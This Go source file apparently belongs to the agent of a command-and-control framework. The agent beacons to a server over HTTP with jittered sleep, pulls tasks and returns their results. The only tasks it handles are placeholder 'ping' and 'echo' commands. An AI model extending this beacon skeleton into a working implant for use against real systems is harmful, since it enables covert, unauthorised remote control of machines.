package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"math"
	"math/rand"
	"numinon_shadow/internal/agent/comm"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"time"
)

// Agent represents an agent instance
type Agent struct {
	config       config.AgentConfig
	communicator comm.Communicator
	stopChan     chan struct{}
	rng          *rand.Rand
}

// NewAgent creates and initializes a new Agent instance.
func NewAgent(cfg config.AgentConfig) (*Agent, error) {
	log.Println("|AGENT INIT|-> Creating new agent instance...")

	communicator, err := comm.NewHttp1ClearCommunicator(cfg)
	if err != nil {
		return nil, err
	}

	log.Printf("|AGENT INIT|-> Agent configured for protocol: %s", cfg.Protocol)

	agent := &Agent{
		config:       cfg,
		communicator: communicator,
		stopChan:     make(chan struct{}),
		rng:          rand.New(rand.NewSource(time.Now().UnixNano())),
	}

	log.Println("|AGENT INIT|-> Agent instance created successfully.")
	return agent, nil
}

// calculateSleepWithJitter calculates the next sleep duration based on BaseSleep and Jitter.
func (a *Agent) calculateSleepWithJitter() time.Duration {
	delay := float64(a.config.Delay)
	jitter := a.config.Jitter

	// Calculate the jitter amount
	jitterAmount := delay * jitter

	// Generate a random factor between -1.0 and 1.0
	randomFactor := (a.rng.Float64() * 2) - 1

	// Apply the jitter to the delay
	finalSleep := delay + (jitterAmount * randomFactor)

	if finalSleep < 0 {
		return time.Duration(math.Abs(finalSleep))
	}

	return time.Duration(finalSleep)
}

// executeTask processes a received task, performs the action, and sends the result.
func (a *Agent) executeTask(task models.ServerTaskResponse) {
	log.Printf("|AGENT TASK|-> Executing Task ID: %s, Command: %s", task.TaskID, task.Command)

	// instantiate emtpy AgentTaskResult struct to hold result
	// also, assign the ID of the result = ID of task (as communicated by the server)
	var result models.AgentTaskResult
	result.TaskID = task.TaskID

	// Placeholder Command Execution
	// For now we'll just perform a very simple function right here
	// But in future we'll only do a function call here
	// Each action's actual logic (doing) will be in its own function
	// This switch simple acts as a switchboard

	switch task.Command {
	case "ping":
		log.Println("|AGENT TASK|-> Handling 'ping' command.")
		result.Status = "success"
		result.Output = []byte("pong")
	case "echo":
		log.Printf("|AGENT TASK|-> Handling 'echo' command with args: %v", task.Data)
		result.Status = "success"
		result.Output = []byte(fmt.Sprintf("Echoing args: %v", task.Data))
	default:
		log.Printf("|WARN AGENT TASK| Received unknown command: %s", task.Command)
		result.Status = "error"
		result.Error = fmt.Sprintf("Unknown command received: %s", task.Command)
	}
	// --- End Placeholder Logic ---

	// Now marshall the result before sending it back using SendResult
	resultBytes, err := json.Marshal(result)
	if err != nil {
		log.Printf("|❗ERR AGENT TASK| Failed to marshal result for Task ID %s: %v", task.TaskID, err)
		return // Cannot send result if marshalling fails
	}

	// If we get here our AgentTaskResult struct has been marshalled as resultBytes
	// Now pass it to SendResult()
	log.Printf("|AGENT TASK|-> Sending result for Task ID %s (%d bytes)...", task.TaskID, len(resultBytes))
	err = a.communicator.SendResult(resultBytes)
	if err != nil {
		log.Printf("|❗ERR AGENT TASK| Failed to send result for Task ID %s: %v", task.TaskID, err)
	} else {
		log.Printf("|AGENT TASK|-> Successfully sent result for Task ID %s.", task.TaskID)
	}
}

// runHttpLoop handles the main check-in cycle for HTTP-based protocols using time.Sleep and jitter.
func (a *Agent) runHttpLoop() error {
	log.Println("|AGENT LOOP HTTP|-> HTTP loop started.")

	for {
		// Check for stop signal at the beginning of each iteration (non-blocking)
		select {
		// This will come from our Stop() function
		case <-a.stopChan:
			log.Println("|AGENT LOOP HTTP|-> Stop signal received, exiting HTTP loop.")
			return nil
		default:
			sleepDuration := a.calculateSleepWithJitter()

			// PERFORM CHECK-IN
			log.Println("|AGENT LOOP HTTP|-> Performing check-in...")

			responseBytes, err := a.communicator.CheckIn()
			if err != nil {
				log.Printf("|❗ERR AGENT LOOP HTTP| CheckIn failed: %v", err)
				// Error during check-in, proceed to sleep and retry next iteration
				time.Sleep(sleepDuration)
				continue
			}

			// PROCESS CHECKIN
			// First, unmarshall Response Body

			var taskResp models.ServerTaskResponse

			err = json.Unmarshal(responseBytes, &taskResp)
			if err != nil {
				log.Println("Failed to unmarshal response body from HTTP request")
				time.Sleep(sleepDuration)
				continue
			}

			// Next, check if there is no task
			if !taskResp.TaskAvailable {
				log.Println("|AGENT LOOP HTTP|-> No task from server, going back to sleep.")
				time.Sleep(sleepDuration)
				continue
			}

			// Getting here implies there is a task, still not an issue to check explicitly (for readability)

			if taskResp.TaskAvailable {
				log.Println("|AGENT LOOP HTTP|-> Task is available.")
				log.Printf("|AGENT LOOP HTTP|-> Task received (ID: %s, Cmd: %s). Executing...", taskResp.TaskID, taskResp.Command)
				a.executeTask(taskResp) // Execute the task (which will send results internally)
			}

			log.Printf("|AGENT LOOP HTTP|-> Sleeping for %v...", sleepDuration)
			time.Sleep(sleepDuration)
		}
	}
}

// Start initiates the agent's main operational loop based on the configured protocol.
func (a *Agent) Start() error {
	log.Printf("|AGENT START|-> Starting agent main loop for protocol %s...", a.communicator.Type())

	switch a.communicator.Type() {
	case config.HTTP1Clear, config.HTTP1TLS, config.HTTP2TLS, config.HTTP3:
		log.Println("|AGENT START|-> Entering HTTP run loop.")
		return a.runHttpLoop()
	case config.WebsocketClear, config.WebsocketSecure:
		return fmt.Errorf("WS runloop not yet implemented")
	default:
		log.Printf("|❗ERR AGENT START| Unknown or unsupported communicator type: %s", a.communicator.Type())
		return fmt.Errorf("unknown communicator type: %s", a.communicator.Type())
	}
}

// Stop signals the agent to gracefully shut down.
func (a *Agent) Stop() {
	log.Println("|AGENT STOP|-> Stop requested. Signaling stop channel...")
	// Close the channel to signal all listening goroutines (like runHttpLoop)
	// Use a non-blocking send to avoid blocking if the channel is already closed or not listened to.
	select {
	case <-a.stopChan:
		// Already closed, nothing to do.
	default:
		close(a.stopChan)
	}

	// Allow communicator to clean up
	if err := a.communicator.Disconnect(); err != nil {
		log.Printf("|WARN AGENT STOP| Error during disconnect on stop: %v", err)
	}
	log.Println("|AGENT STOP|-> Stop signal sent.")
}
